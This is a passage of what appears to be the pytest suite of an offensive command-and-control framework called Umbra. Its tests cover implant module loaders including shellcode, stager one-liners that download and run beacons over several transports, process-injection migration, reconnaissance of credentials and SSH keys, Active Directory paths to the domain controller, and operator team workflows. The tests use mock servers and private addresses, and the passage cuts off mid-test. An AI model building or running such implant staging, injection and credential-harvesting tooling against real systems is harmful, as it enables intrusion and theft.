        result = client.wait_for_result(task_id, timeout=10, poll=0.05)
        assert result["state"] == "done", result
        assert result["out"] == b"umbra", result
        assert (result.get("meta") or {}).get("format") == "wasm", result

        # A module that is not a webassembly module is refused, and the
        # reason travels back with the answer.
        _armory_module(server, "broken-wasm", b"not a module", "wasm", [])
        task_id = client.armory_run("broken-wasm", "agent-wasm")
        result = client.wait_for_result(task_id, timeout=10, poll=0.05)
        assert result["state"] == "failed", result
        assert result["err"], result
    finally:
        client.close()
        agent.stop()
        server.stop()


def test_a_script_module_runs_in_the_sandbox():
    """The script loader runs the module, and holds the host calls."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433

    token = b"operator-token-script-0123456789"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-script")
    agent.start()
    source = (b'var total = 0\n'
              b'var index = 0\n'
              b'while index < 4 {\n'
              b'  total = total + index\n'
              b'  index = index + 1\n'
              b'}\n'
              b'log total\n'
              b'call sha256 "umbra"\n')
    _armory_module(server, "script-demo", source, "script", ["hash"])

    from umbra_cli.client import OperatorClient

    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        deadline = time.time() + 5
        while time.time() < deadline and not client.agents():
            time.sleep(0.05)

        task_id = client.armory_run("script-demo", "agent-script")
        result = client.wait_for_result(task_id, timeout=10, poll=0.05)
        assert result["state"] == "done", result
        # The sum of the first four numbers, and the digest of "umbra".
        assert result["out"].startswith(b"6\n"), result
        assert hashlib.sha256(b"umbra").hexdigest().encode() in result["out"], result

        # The same script without the capability is refused by the
        # sandbox itself, not only by the door.
        _armory_module(server, "script-no-hash", source, "script", [])
        task_id = client.armory_run("script-no-hash", "agent-script")
        result = client.wait_for_result(task_id, timeout=10, poll=0.05)
        assert result["state"] == "failed", result
        assert "may not hash" in (result.get("err") or ""), result
    finally:
        client.close()
        agent.stop()
        server.stop()


def test_the_implementations_share_the_module_abi():
    """The manifest, the loaders and the refusals are in every language."""
    rust_manifest = read_text("implant/rust/src/manifest.rs")
    assert "UMBRAMOD1" in rust_manifest
    for marker in ("pub fn parse", "pub fn missing", "pub fn check_args"):
        assert marker in rust_manifest, marker

    rust_wasm = read_text("implant/rust/src/wasm.rs")
    for marker in ("HOST_MODULE", "\"log\"", "\"sha256\"", "\"decrypt\"",
                   "MAX_STEPS", "the module ends too early"):
        assert marker in rust_wasm, marker

    rust_script = read_text("implant/rust/src/script.rs")
    for marker in ("\"sha256\"", "\"decrypt\"", "\"arg\"", "MAX_STEPS"):
        assert marker in rust_script, marker

    python_runtime = read_text("tools/module_runtime.py")
    for marker in ("HOST_MODULE", "\"log\"", "\"sha256\"", "\"decrypt\""):
        assert marker in python_runtime, marker

    rust_shellcode = read_text("implant/rust/src/shellcode.rs")
    for marker in ("VirtualAlloc", "PAGE_EXECUTE_READWRITE", "VirtualFree"):
        assert marker in rust_shellcode, marker

    rust_task = read_text("implant/rust/src/task.rs")
    for marker in ("\"wasm\"", "\"script\"", "\"shellcode\"", "run_module_as"):
        assert marker in rust_task, marker

    go_abi = read_text("server/internal/armory/abi.go")
    for marker in ("UMBRAMOD1", "ManifestMagic", "MissingCapabilities",
                   "ABIManifest"):
        assert marker in go_abi, marker

    go_catalogue = read_text("server/internal/armory/catalogue.go")
    for marker in ("func (r *Registry) Search", "func (r *Registry) Resolve",
                   "func (r *Registry) InstallVersion",
                   "func (r *Registry) ImportCatalog"):
        assert marker in go_catalogue, marker

    protocol = read_text("docs/PROTOCOL.md")
    assert "### 7.2j The module ABI" in protocol
    for kind in ("| `wasm` |", "| `script` |", "| `shellcode` |"):
        assert kind in protocol, kind


def test_a_stager_is_rendered_for_every_transport():
    """Every transport of the framework gets its own one-liner."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433

    token = b"operator-token-stager-0123456789"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-stager")
    agent.start()

    from umbra_cli.client import OperatorClient

    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        deadline = time.time() + 5
        while time.time() < deadline and not client.agents():
            time.sleep(0.05)

        # The download stager of every transport names the transport and
        # the address of the server.
        for transport in ("tcp", "http", "ws", "dns", "smtp", "s3"):
            script = client.stager_generate(
                platform="linux",
                transport=transport,
                server="10.0.0.5:4001",
                url="https://10.0.0.5/agent.bin",
                sha256="ab" * 32,
            )
            assert f"UMBRA_TRANSPORT={transport}" in script, (transport, script)
            assert "UMBRA_SERVER=10.0.0.5:4001" in script, script
            assert "sha256sum -c" in script, script

        # The http transport carries the route, the dns one the domain.
        script = client.stager_generate(platform="linux", transport="http",
                                        server="10.0.0.5", url="https://x/y")
        assert "UMBRA_HTTP_PATH=" in script, script
        script = client.stager_generate(platform="linux", transport="dns",
                                        server="10.0.0.5", url="https://x/y",
                                        dns_domain="tunnel.example")
        assert "UMBRA_DNS_DOMAIN=tunnel.example" in script, script

        # The windows stager is powershell.
        script = client.stager_generate(platform="windows", transport="tcp",
                                        server="10.0.0.5:4001",
                                        url="https://10.0.0.5/agent.bin")
        assert "Invoke-WebRequest" in script, script
        assert "$env:UMBRA_TRANSPORT=tcp;" in script, script
    finally:
        client.close()
        agent.stop()
        server.stop()


def test_the_store_stager_pulls_the_beacon_from_the_server():
    """The stager of the store mode fetches from the file store."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433

    token = b"operator-token-store-0123456789ab"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-store")
    agent.start()

    from umbra_cli.client import OperatorClient, OperatorError

    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        deadline = time.time() + 5
        while time.time() < deadline and not client.agents():
            time.sleep(0.05)

        script = client.stager_generate(
            platform="windows",
            transport="http",
            server="10.0.0.5",
            mode="store",
            store="beacon.exe",
            store_base="http://10.0.0.5:8080",
        )
        assert "http://10.0.0.5:8080/api/v1/artifact/beacon.exe" in script, script

        # Without the name of the artifact there is nothing to pull.
        with pytest.raises(OperatorError):
            client.stager_generate(platform="windows", transport="http",
                                   server="10.0.0.5", mode="store")
    finally:
        client.close()
        agent.stop()
        server.stop()


def test_the_offline_stager_carries_the_beacon():
    """The offline stager holds the beacon inside itself."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433

    token = b"operator-token-offline-0123456789"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-offline")
    agent.start()

    from umbra_cli.client import OperatorClient, OperatorError

    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        deadline = time.time() + 5
        while time.time() < deadline and not client.agents():
            time.sleep(0.05)

        payload = b"UMBRA-BEACON-BINARY"
        script = client.stager_generate(
            platform="linux",
            transport="tcp",
            server="10.0.0.5:4001",
            mode="offline",
            payload=payload,
        )
        assert base64.b64encode(payload).decode() in script, script
        assert "base64 -d" in script, script

        # The offline stager without a payload is refused.
        with pytest.raises(OperatorError):
            client.stager_generate(platform="linux", transport="tcp",
                                   server="10.0.0.5:4001", mode="offline")
    finally:
        client.close()
        agent.stop()
        server.stop()


def test_the_shim_proves_the_digest():
    """The shim is the digest check on its own."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433

    token = b"operator-token-shim-0123456789ab"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-shim")
    agent.start()

    from umbra_cli.client import OperatorClient, OperatorError

    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        deadline = time.time() + 5
        while time.time() < deadline and not client.agents():
            time.sleep(0.05)

        script = client.stager_generate(
            platform="windows",
            transport="http",
            server="10.0.0.5",
            url="https://10.0.0.5/agent.bin",
            sha256="cd" * 32,
            mode="shim",
        )
        assert "Get-FileHash" in script, script
        assert "digest mismatch" in script, script

        # A shim without a digest has nothing to prove.
        with pytest.raises(OperatorError):
            client.stager_generate(platform="windows", transport="http",
                                   server="10.0.0.5",
                                   url="https://10.0.0.5/agent.bin", mode="shim")
    finally:
        client.close()
        agent.stop()
        server.stop()


def test_a_migration_moves_the_work_into_another_process():
    """The migration reports what it did and keeps the identity."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433

    token = b"operator-token-migrate-012345678"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-migrate")
    agent.start()

    from umbra_cli.client import OperatorClient

    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        deadline = time.time() + 5
        while time.time() < deadline and not client.agents():
            time.sleep(0.05)

        # A migration into a process that already runs.
        task_id = client.submit("agent-migrate", "inject", {
            "mode": "migrate",
            "pid": 4242,
            "data": b"PE-payload",
        })
        result = client.wait_for_result(task_id, timeout=10, poll=0.05)
        assert result["state"] == "done", result
        assert b"moved 10 bytes into pid 4242" in result["out"], result
        meta = result.get("meta") or {}
        assert meta.get("migrated") is True, meta
        assert meta.get("migrate_pid") == 4242, meta
        assert meta.get("migrate_agent") == "agent-migrate", meta

        # A migration that has no target is refused.
        task_id = client.submit("agent-migrate", "inject", {
            "mode": "migrate",
            "data": b"PE-payload",
        })
        result = client.wait_for_result(task_id, timeout=10, poll=0.05)
        assert result["state"] == "failed", result
        assert "target" in (result.get("err") or ""), result
    finally:
        client.close()
        agent.stop()
        server.stop()


def test_the_stagers_and_the_migration_are_in_every_implementation():
    """The stager shapes and the migration are in the code of every side."""
    stager = read_text("server/internal/stager/stager.go")
    for marker in ("ModeDownload", "ModeStore", "ModeOffline", "ModeShim",
                   "StoreRoute", "func Render", "func Shim"):
        assert marker in stager, marker
    for transport in ("TransportTCP", "TransportHTTP", "TransportWS",
                      "TransportDNS", "TransportSMTP", "TransportS3"):
        assert transport in stager, transport

    operator = read_text("server/internal/link/operator.go")
    assert "stager.Options{" in operator
    assert '"mode"' in operator

    http = read_text("server/internal/link/http.go")
    assert "/api/v1/artifact/" in http

    migrate = read_text("implant/rust/src/migrate.rs")
    for marker in ("pub fn migrate", "pub fn plan_from_args", "CreateProcessW",
                   "SuspendThread", "CreateRemoteThread"):
        assert marker in migrate, marker

    task = read_text("implant/rust/src/task.rs")
    assert "crate::migrate::migrate" in task
    assert "exit_after" in task

    beacon = read_text("implant/rust/src/beacon.rs")
    assert "task::wants_exit" in beacon

    config = read_text("implant/rust/src/config.rs")
    assert "pub fn handover" in config

    protocol = read_text("docs/PROTOCOL.md")
    assert "| `inject` |" in protocol


def test_a_recon_profile_answers_with_the_findings():
    """One profile runs a bundle of checks and answers with the findings."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433

    token = b"operator-token-recon-profile-01234567"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-profile")
    agent.start()

    from umbra_cli.client import OperatorClient

    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        deadline = time.time() + 5
        while time.time() < deadline and not client.agents():
            time.sleep(0.05)

        # The profile runs the bundle and answers with the findings.
        task_id = client.submit("agent-profile", "recon", {"profile": "windows"})
        result = client.wait_for_result(task_id, timeout=10, poll=0.05)
        assert result["state"] == "done", result
        report = result["out"].decode()
        assert "profile : windows" in report, report
        assert "findings:" in report, report
        assert "[high  ]" in report, report

        # The findings travel with the answer, one record per finding.
        findings = (result.get("meta") or {}).get("recon", {}).get("findings", [])
        assert findings, result
        kinds = {finding["kind"] for finding in findings}
        assert "user" in kinds, kinds
        assert "wmi" in kinds, kinds
        for finding in findings:
            assert finding["name"], finding
            assert finding["severity"] in ("info", "low", "medium", "high"), finding
        assert (result.get("meta") or {}).get("recon_total") == len(findings), result

        # The checks may be named one by one, and the list wins over the
        # profile.
        task_id = client.submit("agent-profile", "recon",
                                {"profile": "windows", "checks": ["cloud"]})
        result = client.wait_for_result(task_id, timeout=10, poll=0.05)
        assert result["state"] == "done", result
        only_cloud = (result.get("meta") or {}).get("recon", {}).get("findings", [])
        assert only_cloud, result
        assert {f["kind"] for f in only_cloud} == {"cloud"}, only_cloud

        # A profile that is not known is refused.
        task_id = client.submit("agent-profile", "recon", {"profile": "nonsense"})
        result = client.wait_for_result(task_id, timeout=10, poll=0.05)
        assert result["state"] == "failed", result
        assert result["code"] != 0, result
        assert b"nonsense" in result["out"] + result.get("err", "").encode(), result
    finally:
        client.close()
        agent.stop()
        server.stop()


def test_the_domain_map_finds_the_path_to_the_controller():
    """The map answers with the path from the identity to the controller."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433

    token = b"operator-token-domain-map-012345678"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-map")
    agent.start()

    from umbra_cli.client import OperatorClient

    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        deadline = time.time() + 5
        while time.time() < deadline and not client.agents():
            time.sleep(0.05)

        task_id = client.submit("agent-map", "domain.map", {})
        result = client.wait_for_result(task_id, timeout=10, poll=0.05)
        assert result["state"] == "done", result
        report = result["out"].decode()
        assert "identity  : CORP\\admin@corp.example" in report, report
        assert "paths     :" in report, report

        paths = (result.get("meta") or {}).get("domain_map", [])
        assert paths, result
        assert (result.get("meta") or {}).get("domain_paths") == len(paths), result
        first = paths[0]
        assert "MemberOf" in first["text"], first
        assert "dc01.corp.example" in first["text"], first
        assert first["steps"][0]["kind"] == "MemberOf", first

        # A named target is reached by its own path.
        task_id = client.submit("agent-map", "domain.map",
                                {"target": "web01.corp.example"})
        result = client.wait_for_result(task_id, timeout=10, poll=0.05)
        assert result["state"] == "done", result
        paths = (result.get("meta") or {}).get("domain_map", [])
        assert paths, result
        assert paths[0]["steps"][-1]["target"] == "web01.corp.example", paths
    finally:
        client.close()
        agent.stop()
        server.stop()


def test_the_suggestions_follow_the_findings():
    """The framework scores the findings and says what could be tried."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433

    token = b"operator-token-suggest-0123456789ab"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-suggest")
    agent.start()

    from umbra_cli.client import OperatorClient

    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        deadline = time.time() + 5
        while time.time() < deadline and not client.agents():
            time.sleep(0.05)

        # The findings may travel with the task: the operator already has
        # them and does not have to collect them twice.
        task_id = client.submit("agent-suggest", "recon.suggest", {
            "findings": [
                {"kind": "cloud", "name": "/root/.aws/credentials",
                 "severity": "high", "detail": "", "source": ""},
                {"kind": "listener", "name": "0.0.0.0:22",
                 "severity": "info", "detail": "", "source": ""},
            ],
        })
        result = client.wait_for_result(task_id, timeout=10, poll=0.05)
        assert result["state"] == "done", result
        items = (result.get("meta") or {}).get("suggestions", {}).get("suggestions", [])
        assert items, result
        assert items[0]["kind"] == "download", items
        assert items[0]["score"] >= 70, items
        for item in items:
            assert item["title"], item
            assert item["why"], item
            assert 0 <= item["score"] <= 100, item
            assert item["kind"], item

        # Without findings the implant collects them itself.
        task_id = client.submit("agent-suggest", "recon.suggest",
                                {"profile": "cloud"})
        result = client.wait_for_result(task_id, timeout=10, poll=0.05)
        assert result["state"] == "done", result
        items = (result.get("meta") or {}).get("suggestions", {}).get("suggestions", [])
        assert items, result
        assert items[0]["kind"] == "download", items
    finally:
        client.close()
        agent.stop()
        server.stop()


def test_the_reconnaissance_is_in_every_implementation():
    """The profiles, the map and the suggestions are in the code of every side."""
    profile = read_text("implant/rust/src/profile.rs")
    for marker in ("pub fn run", "pub fn suggest", "pub fn profile_groups",
                   "pub struct Finding", "pub struct Suggestion"):
        assert marker in profile, marker
    for check in ("users", "groups", "shares", "listeners", "scheduled",
                  "services", "software", "browser", "sshkeys", "history",
                  "recent", "wmi", "kernel", "ebpf", "cloud", "container"):
        assert '"%s"' % check in profile, check

    domain = read_text("implant/rust/src/domain.rs")
    assert "pub fn paths" in domain
    assert "pub fn map_report" in domain

    task = read_text("implant/rust/src/task.rs")
    assert '"recon.suggest"' in task
    assert '"domain.map"' in task
    assert "crate::profile::run" in task

    twin = read_text("tools/recon_runtime.py")
    assert "def profile_groups" in twin
    assert "def suggest" in twin
    assert "def domain_paths" in twin

    console = read_text("operator/umbra_cli/cli.py")
    assert '"recon"' in console
    assert '"domain-map"' in console
    assert '"suggest"' in console

    protocol = read_text("docs/PROTOCOL.md")
    assert "| `recon.suggest` |" in protocol
    assert "| `domain.map` |" in protocol
    assert "### 7.2k" in protocol


def test_the_presence_of_a_console_expires():
    """A console that stopped talking is silent, and its claim expires."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import MockServer  # noqa: WPS433

    token = b"operator-token-presence-012345678"
    bob_token = b"operator-token-presence-bob-01234"
    server = MockServer(AGENT_PSK, {"alice": token, "bob": bob_token})
    server.start()
    from umbra_cli.client import OperatorClient

    client = OperatorClient(server.address, token.decode(), "alice")
    other = OperatorClient(server.address, bob_token.decode(), "bob")
    try:
        client.connect()
        other.connect()
        ops = {row["name"]: row for row in client.operators()}
        assert set(ops) == {"alice", "bob"}, ops
        # A console that just talked is neither silent nor stale.
        assert ops["bob"]["silent"] is False, ops
        assert ops["bob"]["stale"] is False, ops
        assert ops["bob"]["idle_sec"] < 90, ops
        assert ops["bob"]["expires_at"] > 0, ops

        # The presence of a console that went quiet expires: the server
        # keeps the console in the list, but it is silent and stale.
        with server._lock:
            live = server.op_sessions.get("bob")
            if live is not None:
                live["last_seen"] = time.time() - 600
        ops = {row["name"]: row for row in client.operators()}
        assert ops["bob"]["silent"] is True, ops
        assert ops["bob"]["stale"] is True, ops
        assert ops["bob"]["idle_sec"] > 120, ops
        # The console that is still talking is fine.
        assert ops["alice"]["stale"] is False, ops

        # The channel shows the same truth.
        in_channel = {row["name"]: row for row in client.chat_operators()}
        assert in_channel["bob"]["stale"] is True, in_channel
        assert in_channel["alice"]["stale"] is False, in_channel
    finally:
        client.close()
        other.close()
        server.stop()


def test_a_task_is_handed_to_a_colleague():
    """The assignment shows up in the inbox of the colleague."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433

    token = b"operator-token-assign-0123456789a"
    server = MockServer(AGENT_PSK, {"alice": token, "bob": b"operator-token-assign-bob-01234567"})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-assign")
    agent.start()

    from umbra_cli.client import OperatorClient

    alice = OperatorClient(server.address, token.decode(), "alice")
    bob = OperatorClient(server.address, b"operator-token-assign-bob-01234567".decode(), "bob")
    try:
        alice.connect()
        bob.connect()
        deadline = time.time() + 5
        while time.time() < deadline and not alice.agents():
            time.sleep(0.05)

        task_id = alice.submit("agent-assign", "shell", {"cmd": "id"})

        # The colleague sees the task in the inbox.
        data = alice.assign_task(task_id, "bob")
        assert data["assigned_to"] == "bob", data
        assert data["assigned_by"] == "alice", data

        inbox = bob.inbox("bob")
        assert [t["id"] for t in inbox] == [task_id], inbox
        assert inbox[0]["assigned_to"] == "bob", inbox

        # The task itself carries the assignment.
        task = alice.task(task_id)
        assert task["assigned_to"] == "bob", task

        # The assignment can be taken back.
        alice.assign_task(task_id, "")
        assert bob.inbox("bob") == [], bob.inbox("bob")

        # An assignment to somebody who is not here fails loudly.
        with pytest.raises(Exception):
            alice.assign_task(task_id, "nobody")
    finally:
        alice.close()
        bob.close()
        agent.stop()
        server.stop()


def test_a_claim_says_who_holds_it_and_for_how_long():
    """The claim of a task carries its state and its age."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433

    token = b"operator-token-claim-0123456789a"
    bob_token = b"operator-token-claim-bob-0123456"
    server = MockServer(AGENT_PSK, {"alice": token, "bob": bob_token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-claim")
    agent.start()

    from umbra_cli.client import OperatorClient

    client = OperatorClient(server.address, token.decode(), "alice")
    other = OperatorClient(server.address, bob_token.decode(), "bob")
    try:
        client.connect()
        other.connect()
        deadline = time.time() + 5
        while time.time() < deadline and not client.agents():
            time.sleep(0.05)

        task_id = client.submit("agent-claim", "shell", {"cmd": "id"})
        other.claim(task_id)
        task = client.task(task_id)
        assert task["claimed_by"] == "bob", task
        assert task["claim_state"] == "live", task
        assert task["claimed_age"] >= 0, task
        assert task["claim_expires_at"] > 0, task

        # A claim whose holder is gone expires: the task is free again.
        with server._lock:
            live = server.op_sessions.get("bob")
            if live is not None:
                live["last_seen"] = time.time() - 600
        task = client.task(task_id)
        assert task["claim_state"] == "expired", task
        assert task["claimed_by"] == "bob", task
    finally:
        client.close()
        other.close()
        agent.stop()
        server.stop()


def test_the_chat_carries_mentions_and_never_reaches_an_agent():
    """A mention is a highlight, and the chat is not for the implants."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433

    token = b"operator-token-chat-0123456789ab"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-chat")
    agent.start()

    from umbra_cli.client import OperatorClient

    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        deadline = time.time() + 5
        while time.time() < deadline and not client.agents():
            time.sleep(0.05)

        client.say("@bob the dc is open, take it")
        history = client.chat_history(10)
        assert history, history
        last = history[-1]
        assert last["mentions"] == ["bob"], last

        # The chat is the team channel: it never lands in the stream the
        # implants read.
        assert not getattr(agent, "chat_received", []), "the agent saw the chat"
        events = client.events(0, 50).get("events", [])
        kinds = {e.get("kind") for e in events}
        assert "chat" in kinds, kinds
    finally:
        client.close()
        agent.stop()
        server.stop()


def test_the_namespace_of_the_team_is_shared():
    """The aliases are written by the team, and everybody sees who wrote them."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import MockServer  # noqa: WPS433

    token = b"operator-token-namespace-012345678"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    from umbra_cli.client import OperatorClient

    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        data = client.alias_add("team-probe", kind="shell",
                                 args={"cmd": "whoami"}, description="who am i")
        assert data["by"] == "alice", data
        names = [a["name"] for a in client.alias_list()]
        assert "team-probe" in names, names
        entry = [a for a in client.alias_list() if a["name"] == "team-probe"][0]
        assert entry["by"] == "alice", entry
        assert entry["description"] == "who am i", entry

        client.alias_remove("team-probe")
        names = [a["name"] for a in client.alias_list()]
        assert "team-probe" not in names, names
    finally:
        client.close()
        server.stop()


def test_the_handover_document_tells_the_whole_story():
    """The handover holds the inventory, the open work and the findings."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433

    token = b"operator-token-handover-012345678"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-handover")
    agent.start()

    from umbra_cli.client import OperatorClient

    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        deadline = time.time() + 5
        while time.time() < deadline and not client.agents():
            time.sleep(0.05)

        handover_task = client.submit("agent-handover", "recon", {"profile": "windows"})
        client.wait_for_result(handover_task, timeout=20, poll=0.05)

        payload = client.team_handover()
        assert payload["by"] == "alice", payload
        assert payload["generated"] > 0, payload
        assert any(a["id"] == "agent-handover" for a in payload["agents"]), payload
        assert payload["findings"], payload
        assert payload["operators"], payload
        assert "sessions" in payload and "artifacts" in payload, payload

        # The console renders the document out of it.
        from umbra_cli.cli import render_handover
        document = render_handover(payload)
        assert "# Handover" in document, document
        assert "The inventory" in document, document
        assert "agent-handover" in document, document
    finally:
        client.close()
        agent.stop()
        server.stop()


def test_the_collaboration_is_in_every_implementation():
    """The presence, the lease, the assignment and the handover are everywhere."""
    hub = read_text("server/internal/hub/hub.go")
    for marker in ("PresenceTTL", "ClaimLease", "func (h *Hub) ExpireClaims",
                   "func (h *Hub) AssignTask", "func parseMentions"):
        assert marker in hub, marker

    store = read_text("server/internal/store/store.go")
    assert "AssignedTo" in store, "the assignment is not in the store"
    assert "func (s *Store) Assign(" in store
    assert "func (s *Store) AssignedTasks(" in store

    operator = read_text("server/internal/link/operator.go")
    for rpc in ("task.assign", "chat.operators", "alias.add", "alias.remove",
                "team.handover"):
        assert 'case "%s"' % rpc in operator, rpc

    rbac = read_text("server/internal/rbac/rbac.go")
    for rpc in ("task.assign", "chat.operators", "alias.add", "alias.remove",
                "team.handover"):
        assert '"%s"' % rpc in rbac, rpc

    mock = read_text("tools/mock_server.py")
    for rpc in ("task.assign", "chat.operators", "alias.add", "alias.remove",
                "team.handover"):
        assert '"%s"' % rpc in mock, rpc

    console = read_text("operator/umbra_cli/cli.py")
    assert "render_handover" in console, console
    assert '"assign"' in console, console
    assert '"inbox"' in console, console

    # The namespace of the team is kept between two runs of the server.
    aliases = read_text("server/internal/alias/alias.go")
    assert "func (r *Registry) Save()" in aliases, aliases
    assert "func (r *Registry) Load()" in aliases, aliases
    main = read_text("server/cmd/umbra-server/main.go")
    assert "aliases.SetPath" in main, main

    protocol = read_text("docs/PROTOCOL.md")
    assert "| `task.assign` |" in protocol, protocol
    assert "| `chat.operators` |" in protocol, protocol
    assert "| `team.handover` |" in protocol, protocol


def test_a_workflow_runs_the_steps_of_a_phase():
    """A workflow is a named sequence of steps, and it runs on the server."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433

    token = b"operator-token-workflow-0123456789a"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-workflow")
    agent.start()

    from umbra_cli.client import OperatorClient

    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        deadline = time.time() + 5
        while time.time() < deadline and not client.agents():
            time.sleep(0.05)

        # The workflow is written once and everybody can run it.
        steps = [
            {"kind": "task", "agent": "{{target}}", "task_kind": "shell",
             "args": {"cmd": "id"}},
            {"kind": "wait", "seconds": 1},
            {"kind": "report", "title": "The phase"},
        ]
        data = client.workflow_add("sweep", steps, description="the first phase",
                                   params=["target"])
        assert data["workflow"]["name"] == "sweep", data
        assert len(data["workflow"]["steps"]) == 3, data

        listing = client.workflow_list()
        names = [w["name"] for w in listing["workflows"]]
        assert "sweep" in names, listing

        # A run without its parameters is refused: a workflow that runs the
        # wrong thing is worse than no workflow at all.
        with pytest.raises(Exception):
            client.workflow_run("sweep")

        run = client.workflow_run("sweep", {"target": "agent-workflow"})
        run_id = run["run_id"]
        assert run_id, run

        # The run happens on the server; the console watches it.
        state = ""
        deadline = time.time() + 20
        while time.time() < deadline:
            payload = client.workflow_status(run_id)
            state = payload["run"]["state"]
            if state in ("done", "failed", "stopped"):
                break
            time.sleep(0.2)
        assert state == "done", payload

        steps_done = payload["run"]["steps"]
        assert len(steps_done) == 3, steps_done
        assert steps_done[0]["kind"] == "task", steps_done
        assert steps_done[0]["task_id"], steps_done
        assert steps_done[0]["ok"] is True, steps_done
        # The report step collects what the task answered.
        assert "The phase" in payload["run"]["report"], payload["run"]

        # The run is remembered in the catalogue of the runs.
        listing = client.workflow_list()
        assert any(r["id"] == run_id for r in listing["runs"]), listing

        # A workflow can be taken out of the catalogue.
        client.workflow_remove("sweep")
        listing = client.workflow_list()
        assert "sweep" not in [w["name"] for w in listing["workflows"]], listing
    finally:
        client.close()
        agent.stop()
        server.stop()


def test_the_plan_file_is_read_without_a_dependency():
    """The plan is a small YAML subset, read by the console itself."""
    sys.path.insert(0, os.path.join(ROOT, "operator"))
    from umbra_cli.plan import PlanError, load_plan, parse_plan, plan_steps

    text = """
name: sweep
description: sweep the web tier   # the comment
params: [target, kind]
steps:
  - kind: task
    agent: "{{target}}"
    task_kind: "{{kind}}"
    args:
      cmd: "systeminfo"
      deep: true
  - kind: wait
    seconds: 5
  - kind: condition
    condition: ok
  - kind: report
    title: The sweep
"""
    plan = parse_plan(text)
    assert plan["name"] == "sweep", plan
    assert plan["description"] == "sweep the web tier", plan
    assert plan["params"] == ["target", "kind"], plan
    steps = plan_steps(plan)
    assert len(steps) == 4, steps
    assert steps[0]["agent"] == "{{target}}", steps
    assert steps[0]["args"]["cmd"] == "systeminfo", steps
    assert steps[0]["args"]["deep"] is True, steps
    assert steps[1]["seconds"] == 5, steps
    assert steps[3]["title"] == "The sweep", steps

    # JSON is a plan too: a pipeline writes what it already has.
    plan = parse_plan('{"name": "quick", "steps": [{"kind": "task"}]}')
    assert plan["name"] == "quick", plan

    # A plan that is not a plan is refused, with a reason.
    with pytest.raises(PlanError):
        parse_plan("steps: [")
    with pytest.raises(PlanError):
        parse_plan("")
    with pytest.raises(PlanError):
        plan_steps({"name": "x"})


def test_the_operator_experience_is_in_every_implementation():
    """The workflow layer, the plan and the bulk run are everywhere."""
    go_link = read_text("server/internal/link/operator.go")
    for rpc in ("workflow.list", "workflow.add", "workflow.remove",
                "workflow.run", "workflow.status"):
        assert rpc in go_link, rpc
    rbac = read_text("server/internal/rbac/rbac.go")
    for rpc in ("workflow.list", "workflow.add", "workflow.remove",
